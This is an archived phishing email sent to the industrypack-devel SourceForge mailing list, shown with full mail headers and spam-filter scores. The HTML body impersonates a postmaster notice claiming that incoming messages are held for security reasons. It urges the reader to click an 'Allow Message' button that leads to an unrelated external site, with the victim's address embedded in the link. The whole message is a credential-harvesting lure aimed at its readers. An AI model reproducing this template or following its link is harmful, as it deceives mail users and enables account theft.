Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from mail.lfdr.de
	by lfdr with LMTP
	id YJS0Fasgn2lcZAQAu9opvQ
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	for <lists+industrypack-devel@lfdr.de>; Wed, 25 Feb 2026 17:17:47 +0100
X-Original-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 6C27219A673
	for <lists+industrypack-devel@lfdr.de>; Wed, 25 Feb 2026 17:17:46 +0100 (CET)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.sourceforge.net; s=beta; h=Content-Type:Reply-To:From:List-Subscribe:
	List-Help:List-Post:List-Archive:List-Unsubscribe:List-Id:Subject:
	MIME-Version:Message-ID:Date:To:Sender:Cc:Content-Transfer-Encoding:
	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Owner;
	bh=Ba0b5ar9XepvRDlmknTaGb21laz0MwiV4PWgVXTgOFg=; b=FwJ9Fuouo59jTQt+pjvejH9Wed
	iHpPBqb2+8QhSZuN3B94AMSu0luSb6KW/MYhDOjuMKvNzdCe/uOgnBoQYNWpq3ziOnNAcLGbYWvcN
	lbNahQ98+JZpnEPv9HCipEiaZyfMDu4u1Eh7/U4mv406R8ZQrJbuVJzI0qglRe86mhJ4=;
Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1vvHa3-0007iv-Pj
	for lists+industrypack-devel@lfdr.de;
	Wed, 25 Feb 2026 16:17:44 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-2.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <purchase@cheapassignment.com>) id 1vvHa2-0007in-6a
 for industrypack-devel@lists.sourceforge.net;
 Wed, 25 Feb 2026 16:17:43 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=r6l6agdx996iSYDQbmAFyhtVVZ8qtZBk8usJIYpHgzM=; b=k+dCTtoEjzTgerqNgeUrnzCQ+p
 SWMXeTlSVOFHr0xHTVqETFWPrNVAbVS0PFhirNBbKF34w1t0GMTxFXZ49SXbGUz2A54ack8iEQSob
 U0nEGEP5KCA/I43fEREsmZoS2WL8+TcHzInVD4v0d0tFV6bVMcJh0Cz3Fby5WbkhMctE=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=r6l6agdx996iSYDQbmAFyhtVVZ8qtZBk8usJIYpHgzM=; b=J
 usm9s+LtA81zHMCDVRBpjcuTo3zuKAUZPngOVx4U0UtNZd0bRQdqv17liZIguDWfoTL5H6kumfZcs
 5WbICo9SbtM8hk42lYSWoUvjAotBcE6jl7Fj2qJRT02FhPYn2ucn5ZhUabB2jmzgZlmbnzhhbE+ZA
 P77Bmw7dnz/ndwVQ=;
Received: from mail.cheapassignment.com ([74.48.9.188])
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1vvHa1-00027K-Si for industrypack-devel@lists.sourceforge.net;
 Wed, 25 Feb 2026 16:17:42 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=cheapassignment.com; s=dkim; h=Content-Transfer-Encoding:Content-Type:
 MIME-Version:Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=r6l6agdx996iSYDQbmAFyhtVVZ8qtZBk8usJIYpHgzM=; b=RuHFw7KEZyu/yq1J5C81RTat0/
 H7Jy+yfEjkgoH1YlOztaC24PJqhv2eNty1wJB7050qGN22p3AkUG9wtsnPEC0xe3iW2C/GBzQecdF
 8av35zfD8hXpYaMe+tsMlfepq5nvxeNFC6rzWwdhO/eEIG0NQBXRONIWJ6olojaFKB8M=;
Received: from [194.48.143.107]
 by mail.cheapassignment.com with esmtpsa (TLS1.3) tls TLS_AES_256_GCM_SHA384
 (Exim 4.99.1) (envelope-from <purchase@cheapassignment.com>)
 id 1vvHZh-0000000047z-0Z9S
 for industrypack-devel@lists.sourceforge.net;
 Wed, 25 Feb 2026 11:17:21 -0500
To: industrypack-devel@lists.sourceforge.net
Date: 25 Feb 2026 08:17:11 -0800
Message-ID: <20260225081711.F3CF9F43B802DCF0@cheapassignment.com>
MIME-Version: 1.0
X-SPF-Fail: YES
X-Spam-Score: 4.3 (++++)
X-Spam-Report: Spam detection software,
 running on the system "sfi-spamd-1.hosts.colo.sdot.me", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: Postmaster industrypack-devel@lists.sourceforge.net
 Recipient: planning ; 
 Content analysis details:   (4.3 points, 5.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 -0.1 DKIM_VALID_AU Message has a valid DKIM or DK signature from author's
 domain
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature,
 not necessarily valid
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
 envelope-from domain
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.1 MXG_EMAIL_FRAG         BODY: URI with email in fragment
 2.0 PDS_FROM_NAME_TO_DOMAIN From:name looks like To:domain
 1.2 TVD_PH_SUBJ_META1      Email has a Phishy looking subject line
 1.1 PDS_FRNOM_TODOM_NAKED_TO Naked to From name equals to Domain
X-Headers-End: 1vvHa1-00027K-Si
Subject: [Industrypack-devel] Account verification required -Release
 Incoming pending mails!
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
From: "lists.sourceforge.net via Industrypack-devel"
 <industrypack-devel@lists.sourceforge.net>
Reply-To: "lists.sourceforge.net" <purchase@cheapassignment.com>
Content-Type: multipart/mixed; boundary="===============0234737233541720602=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net
X-Rspamd-Server: lfdr
X-Spamd-Result: default: False [-1.31 / 15.00];
	WHITELIST_DMARC(-7.00)[sourceforge.net:D:+];
	DBL_SPAM(6.50)[cheapassignment.com:mid,cheapassignment.com:replyto];
	RWL_MAILSPIKE_EXCELLENT(-0.40)[216.105.38.7:from];
	MAILLIST(-0.20)[mailman];
	R_DKIM_ALLOW(-0.20)[lists.sourceforge.net:s=beta];
	BAD_REP_POLICIES(0.10)[];
	MIME_GOOD(-0.10)[multipart/mixed,text/plain];
	HAS_LIST_UNSUB(-0.01)[];
	RCVD_COUNT_THREE(0.00)[4];
	RCVD_TLS_LAST(0.00)[];
	DKIM_MIXED(0.00)[];
	RECEIVED_HELO_LOCALHOST(0.00)[];
	RCPT_COUNT_ONE(0.00)[1];
	DMARC_POLICY_ALLOW(0.00)[lists.sourceforge.net,none];
	TO_EQ_FROM(0.00)[];
	NEURAL_SPAM(0.00)[0.997];
	ARC_NA(0.00)[];
	MIME_TRACE(0.00)[0:+,1:~,2:+,3:+];
	SUBJECT_ENDS_EXCLAIM(0.00)[];
	R_DKIM_REJECT(0.00)[sourceforge.net:s=x,sf.net:s=x,cheapassignment.com:s=dkim];
	REPLYTO_DOM_NEQ_TO_DOM(0.00)[];
	HAS_REPLYTO(0.00)[purchase@cheapassignment.com];
	TAGGED_RCPT(0.00)[industrypack-devel];
	R_SPF_ALLOW(0.00)[+ip4:216.105.38.7];
	TO_DN_NONE(0.00)[];
	FROM_HAS_DN(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[industrypack-devel@lists.sourceforge.net,industrypack-devel-bounces@lists.sourceforge.net];
	REPLYTO_DOM_NEQ_FROM_DOM(0.00)[];
	RCVD_VIA_SMTP_AUTH(0.00)[];
	MISSING_XM_UA(0.00)[];
	DKIM_TRACE(0.00)[lists.sourceforge.net:+,sourceforge.net:-,sf.net:-,cheapassignment.com:-];
	ASN(0.00)[asn:11320, ipnet:216.105.32.0/21, country:US];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	FORGED_SENDER_MAILLIST(0.00)[];
	DMARC_POLICY_ALLOW_WITH_FAILURES(0.00)[];
	DBL_BLOCKED_OPENRESOLVER(0.00)[www:url]
X-Rspamd-Queue-Id: 6C27219A673
X-Rspamd-Action: no action

--===============0234737233541720602==
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

<html><head>
    <meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body>
    <strong>    </strong><strong>
        </strong><strong>
            </strong>
    <table width=3D"100%" style=3D'color: rgb(51, 51, 51); text-transform: =
none; letter-spacing: normal; font-family: "Lucida Grande", Verdana, Arial,=
 Helvetica, sans-serif; font-size: 11px; font-style: normal; font-weight: 4=
00; word-spacing: 0px; white-space: normal; orphans: 2; widows: 2; text-siz=
e-adjust: 100%; font-variant-ligatures: normal; font-variant-caps: normal; =
-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
coration-style: initial; text-decoration-color:=20
initial;' border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
        <tbody>
            <tr>
                <td class=3D"v1mceSpacing-24" valign=3D"top" style=3D"paddi=
ng-right: 48px; padding-left: 48px; text-size-adjust: 100%;"><strong>
                </strong>
                    <div class=3D"v1mceText" style=3D'width: 564px; text-al=
ign: center; color: rgb(0, 0, 0); padding-top: 0px; font-family: "Helvetica=
 Neue", Helvetica, Arial, Verdana, sans-serif; font-size: 16px; border-top-=
color: currentColor; border-top-width: 0px; border-top-style: none;'></div>=

                </td>
            </tr>
            <tr>
                <td align=3D"center" class=3D"v1mceSpacing-24" valign=3D"to=
p" style=3D"padding-top: 24px; padding-right: 48px; padding-left: 48px; tex=
t-size-adjust: 100%;">
                    <base class=3D" style=3D" href=3D"http://www.[Second]_[=
Minute]_[Second]." valign=3D"top"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                    <p style=3D"margin: 0px 0px 12px;"><span style=3D"font-=
weight: bolder;"><br><br><br><br>&nbsp;Postmaster</span> &nbsp;&nbsp;&nbsp;=
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                        &nbsp;industrypack-devel@lists.sourceforge.net&nbsp=
;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
;&nbsp;&nbsp;&nbsp;<span>&nbsp;</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
&nbsp;&nbsp;
                        <span style=3D"font-weight: bolder;">Recipient: pla=
nning</span> &nbsp;
                        <br></p>
                    <table style=3D"padding: 0px; width: 557px; text-align:=
 left; margin-right: auto; margin-left: auto; border-collapse: collapse; mi=
n-height: 10px;" cellspacing=3D"0" cellpadding=3D"0">
                        <tbody>
                            <tr height=3D"10">
                                <td width=3D"180" height=3D"10" style=3D"ma=
rgin: 0px; padding: 0px; width: 180px; line-height: 10px; font-family: Robo=
to, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 6px; min-height: =
10px;" bgcolor=3D"#c00000">&nbsp;</td>
                                <td width=3D"4" height=3D"10" style=3D"marg=
in: 0px; padding: 0px; width: 4px; line-height: 10px; font-family: Roboto, =
RobotoDraft, Helvetica, Arial, sans-serif; font-size: 6px; min-height: 10px=
;" bgcolor=3D"#ffffff"></td>
                                <td width=3D"180" height=3D"10" style=3D"ma=
rgin: 0px; padding: 0px; width: 180px; line-height: 10px; font-family: Robo=
to, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 6px; min-height: =
10px;" bgcolor=3D"#cccccc"></td>
                                <td width=3D"4" height=3D"10" style=3D"marg=
in: 0px; padding: 0px; width: 4px; line-height: 10px; font-family: Roboto, =
RobotoDraft, Helvetica, Arial, sans-serif; font-size: 6px; min-height: 10px=
;" bgcolor=3D"#ffffff"></td>
                                <td width=3D"180" height=3D"10" style=3D"ma=
rgin: 0px; padding: 0px; width: 180px; line-height: 10px; font-family: Robo=
to, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 6px; min-height: =
10px;" bgcolor=3D"#cccccc">
                                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&n=
bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
bsp;&nbsp;&nbsp;&nbsp;
                                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
 ;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;</td>
                            </tr>
                        </tbody>
                    </table><p style=3D"font-family: arial, sans-serif; mar=
gin-top: 0px;"><span style=3D"font-size: 16px;"><span style=3D"font-size: 1=
1pt;"><br>Hello</span>&nbsp;</span>
industrypack-devel<a style=3D"border-color: rgb(221, 221, 221); text-align:=
 center; color: rgb(36, 36, 36); text-transform: none; text-indent: 0px; le=
tter-spacing: normal; font-family: Arial, Helvetica, sans-serif, serif, Emo=
jiFont; font-size: 14px; font-style: inherit; font-weight: 600; word-spacin=
g: 0px; white-space: normal; background-color: transparent; text-decoration=
-style: initial; text-decoration-color: initial;" rel=3D"nofollow noopener =
noreferrer">
<span style=3D"color: rgb(59, 59, 59); font-family: Consolas, Courier New, =
monospace;">,</span></a><br><br><span style=3D"font-size: 12pt;"><span styl=
e=3D"font-size: 11pt;"><span style=3D"font-size: 13pt;"><span style=3D"font=
-size: 12pt;"><span style=3D"font-size: 11pt;"> </span></span>
                        </span>
                        </span>
                        </span><span style=3D"font-size: 10pt;"><span style=
=3D"font-size: 14pt;"><span style=3D"font-size: 12pt;"><span style=3D"font-=
size: 12pt;"><span style=3D"font-size: 11pt;"><span style=3D"font-size: 13p=
t;">
<span style=3D"font-size: 12pt;"><span style=3D"font-size: 11pt;">We're rea=
ching out&nbsp;to let you know that we were unable to deliver&nbsp;some mes=
sage (s) to your</span></span>
                        </span>
                        </span>
                        </span>
                        </span>
                        </span>
                        </span><br><span style=3D"font-size: 10pt;"><span s=
tyle=3D"font-size: 14pt;"><span style=3D"font-size: 12pt;"><span style=3D"f=
ont-size: 12pt;"><span style=3D"font-size: 11pt;"><span style=3D"font-size:=
 13pt;"><span style=3D"font-size: 12pt;"><span style=3D"font-size: 11pt;">
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;email addre=
ss due to</span></span>
<span style=3D"color: rgb(214, 40, 40);" dir=3D"ltr">security&nbsp;restrict=
ions</span></span></span></span></span></span></span><span><span style=3D"f=
ont-size: 12pt;"><span style=3D"font-size: 11pt;"><span style=3D"font-size:=
 13pt;">
                        </span>
                        </span>
                        </span>
                        </span>
=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20
                        <span style=3D"color: rgb(0, 0, 0);"><span style=3D=
"font-size: 10pt;"><span style=3D"font-size: 14pt;"><span style=3D"font-siz=
e: 12pt;"><span style=3D"font-size: 12pt;"><span style=3D"font-size: 11pt;"=
><span style=3D"font-size: 13pt;"><span style=3D"font-size: 12pt;"><span st=
yle=3D"font-size: 11pt;">on your mail&nbsp;server.</span></span><span style=
=3D"font-size: 11pt;">
</span><span style=3D"font-size: 12pt;"><span style=3D"font-size: 11pt;">2/=
25/2026 8:17:11 a.m.</span></span><span style=3D"font-size: 11pt;">&nbsp;</=
span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>
                        </span>
                        </span>
                        </span>
                        </span>
                        </span>
                        </span>
=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20
                    </p>
                    <p style=3D"font-family: arial, sans-serif; margin-top:=
 0px;"><span><span style=3D"font-size: 12pt;"><span style=3D"font-size: 12p=
t;"><span style=3D"font-size: 11pt;"><span style=3D"font-size: 13pt;"><span=
 style=3D"font-size: 12pt;"><span style=3D"font-size: 11pt;">&nbsp; It appe=
ars that your system settings are currently blocking incoming messages.</sp=
an></span>
                        </span>
                        </span>
                        </span>
                        </span>
                        </span>
=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20
=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20
=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20
                    </p><span style=3D"font-size: 10pt;"><span style=3D"fon=
t-size: 14pt;"><span style=3D"font-size: 12pt;"><span style=3D"font-size: 1=
2pt;"><span style=3D"font-size: 11pt;"><span style=3D"font-size: 13pt;"><sp=
an style=3D"font-size: 12pt;"><span style=3D"font-size: 11pt;">
</span></span>
                    </span>
                    </span>
                    </span>
                    </span>
                    </span>
                    </span>
                    <p style=3D"margin: 0px 0px 12px;"><span style=3D"font-=
weight: bolder;"><span style=3D"font-size: 10pt;"><span style=3D"font-size:=
 14pt;"><span style=3D"font-size: 12pt;"><span style=3D"font-size: 12pt;"><=
span style=3D"font-size: 11pt;"><span style=3D"font-size: 13pt;"><span styl=
e=3D"font-size: 12pt;"><span style=3D"font-size: 11pt;">&nbsp; Account Info=
rmation:</span></span>
                        </span>
                        </span>
                        </span>
                        </span>
                        </span>
                        </span>
                        </span>
                    </p>
                    <p style=3D"margin: 0px 0px 12px;">
                        <span style=3D"font-size: 10pt;"><span style=3D"fon=
t-size: 14pt;"><span style=3D"font-size: 12pt;"><span style=3D"font-size: 1=
2pt;"><span style=3D"font-size: 11pt;"><span style=3D"font-size: 13pt;"><sp=
an style=3D"font-size: 12pt;"><span style=3D"font-size: 11pt;">&nbsp;&nbsp;=
<span style=3D"font-size: 9pt;">Email Address:industrypack-devel@lists.sour=
ceforge.net</span>
                            </span>
                            </span>
                            </span>
                            </span>
                            </span>
                            </span>
                            </span>
                            </span>
                    </p>
                    <p style=3D"margin: 0px 0px 12px;">
                        <span style=3D"font-size: 10pt;"><span style=3D"fon=
t-size: 14pt;"><span style=3D"font-size: 12pt;"><span style=3D"font-size: 1=
2pt;"><span style=3D"font-size: 11pt;"><span style=3D"font-size: 13pt;"><sp=
an style=3D"font-size: 12pt;"><span style=3D"font-size: 11pt;">&nbsp;&nbsp;=
<span style=3D"font-size: 9pt;">Status:</span></span></span>
                        </span>
                        </span>
                        </span>
                        </span>
                        </span>
                        </span><span style=3D"color: rgb(243, 12, 46);"><sp=
an style=3D"font-size: 10pt;"><span style=3D"font-size: 14pt;"><span style=
=3D"font-size: 12pt;">
<span style=3D"font-size: 12pt;"><span style=3D"font-size: 11pt;"><span sty=
le=3D"font-size: 13pt;"><span style=3D"font-size: 12pt;"><span style=3D"fon=
t-size: 11pt;"><span style=3D"font-size: 9pt;">Held</span></span>
                        </span>
                        </span>
                        </span>
                        </span>
                        </span>
                        </span>
                        </span>
                        </span>
                    </p>
                    <a style=3D'padding: 16px 28px; border-radius: 8px; bor=
der: 2px solid rgb(220, 62, 19); border-image: none; color: rgb(255, 255, 2=
55); font-family: "Work Sans", sans-serif; font-size: 16px; font-style: nor=
mal; font-weight: normal; text-decoration: none; display: inline-block; min=
-width: 30px; background-color: rgb(220, 62, 19); text-size-adjust: 100%;' =
href=3D"&#10;https://butzketransportes.com.br/wpcontents/contents/themes/ds=
fZhWpEdjx6JbghEnytQezRsdur6F3VKavcx.html#industrypack-devel@lists.sourcefor=
ge.net" target=3D"_blank" rel=3D"noopener noreferrer">Allow Message</a>
                    <table align=3D"center" style=3D"text-size-adjust: 100%=
;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
                        <tbody>
                            <tr style=3D"text-align: center;"></tr>
                        </tbody>
                    </table>
                </td>
            </tr>
            <tr>
                <td class=3D"v1mceSpacing-24" valign=3D"top" style=3D"paddi=
ng-top: 24px; padding-right: 48px; padding-left: 48px; text-size-adjust: 10=
0%;">
                    <div class=3D"v1mceText" style=3D'width: 225px; height:=
 16px; text-align: center; color: rgb(0, 0, 0); padding-top: 0px; font-fami=
ly: "Helvetica Neue", Helvetica, Arial, Verdana, sans-serif; font-size: 16p=
x; border-top-color: currentColor; border-top-width: 0px; border-top-style:=
 none;'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                        <p class=3D"v1last-child" style=3D'margin: 0px; pad=
ding: 0px; text-align: center; font-family: "Alegreya Sans", Georgia, "Time=
s New Roman", serif;'><br></p>
                    </div>
                </td>
            </tr>
        </tbody>
    </table>




</body></html>


--===============0234737233541720602==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============0234737233541720602==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============0234737233541720602==--
